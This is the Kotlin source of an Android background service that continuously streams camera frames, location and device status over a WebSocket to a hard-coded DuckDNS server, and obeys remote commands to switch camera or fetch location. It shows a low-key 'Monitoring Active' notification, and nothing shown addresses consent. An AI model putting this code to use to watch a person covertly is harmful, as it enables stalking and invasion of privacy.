package com.monitoring.service

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import androidx.lifecycle.LifecycleOwner
import androidx.lifecycle.LifecycleService
import com.monitoring.R
import com.monitoring.collectors.CameraCollector
import com.monitoring.collectors.LocationCollector
import com.monitoring.collectors.SystemCollector
import com.monitoring.utils.DeviceIdManager
import java.util.concurrent.Executors
import java.util.concurrent.ScheduledExecutorService
import java.util.concurrent.TimeUnit

class MonitoringService : LifecycleService() {
    
    private lateinit var wsClient: WebSocketClient
    private lateinit var cameraCollector: CameraCollector
    private lateinit var locationCollector: LocationCollector
    private lateinit var systemCollector: SystemCollector
    
    private val executor: ScheduledExecutorService = Executors.newScheduledThreadPool(2)
    private var cameraFpsCounter = 0
    private val cameraFpsLimit = 5 // 5 FPS
    
    companion object {
        private const val NOTIFICATION_ID = 1
        private const val CHANNEL_ID = "monitoring_service"
        const val SERVER_URL = "wss://kelyastream.duckdns.org/ws/device"
        
        fun start(context: Context) {
            val intent = Intent(context, MonitoringService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
        
        fun stop(context: Context) {
            context.stopService(Intent(context, MonitoringService::class.java))
        }
    }
    
    override fun onCreate() {
        super.onCreate()
        
        // Create notification channel
        createNotificationChannel()
        
        // Start foreground service
        startForeground(NOTIFICATION_ID, createNotification("Starting..."))
        
        // Initialize collectors
        cameraCollector = CameraCollector(this)
        locationCollector = LocationCollector(this)
        systemCollector = SystemCollector(this)
        
        // Initialize WebSocket
        val deviceInfo = DeviceIdManager.getDeviceInfo(this)
        wsClient = WebSocketClient(
            serverUrl = SERVER_URL,
            deviceId = deviceInfo["id"] as String,
            deviceName = deviceInfo["name"] as String,
            deviceInfo = deviceInfo,
            onCommand = { command -> handleCommand(command) }
        )
        
        // Connect
        wsClient.connect()
        
        // Start data collection
        startDataCollection()
        
        updateNotification("Monitoring active")
    }
    
    private fun startDataCollection() {
        // Camera frames with FPS limiting
        cameraCollector.start(this) { frame ->
            cameraFpsCounter++
            if (cameraFpsCounter >= (10 / cameraFpsLimit)) {
                cameraFpsCounter = 0
                wsClient.sendCameraFrame(frame)
            }
        }
        
        // Location updates
        locationCollector.start { location ->
            wsClient.sendLocation(location)
        }
        
        // System info (every 30 seconds)
        executor.scheduleAtFixedRate({
            try {
                val systemInfo = systemCollector.getSystemInfo()
                wsClient.sendSystemInfo(systemInfo)
                
                // Update notification
                updateNotification("Battery: ${systemInfo.batteryLevel}%")
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }, 10, 30, TimeUnit.SECONDS)
    }
    
    private fun handleCommand(command: WebSocketClient.Command) {
        when (command.command) {
            "switch_camera" -> {
                val camera = command.data["camera"] as? String ?: "back"
                cameraCollector.switchCamera(camera, this)
            }
            "get_location" -> {
                locationCollector.getCurrentLocation { location ->
                    location?.let { wsClient.sendLocation(it) }
                }
            }
            "set_fps" -> {
                // Adjust FPS if needed
            }
        }
    }
    
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Monitoring Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Background monitoring service"
            }
            
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.createNotificationChannel(channel)
        }
    }
    
    private fun createNotification(text: String): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Monitoring Active")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }
    
    private fun updateNotification(text: String) {
        val notificationManager = getSystemService(NotificationManager::class.java)
        notificationManager.notify(NOTIFICATION_ID, createNotification(text))
    }
    
    override fun onDestroy() {
        super.onDestroy()
        
        // Stop collectors
        cameraCollector.stop()
        locationCollector.stop()
        
        // Disconnect WebSocket
        wsClient.disconnect()
        
        // Shutdown executor
        executor.shutdown()
    }
    
    override fun onBind(intent: Intent): IBinder? {
        super.onBind(intent)
        return null
    }
}

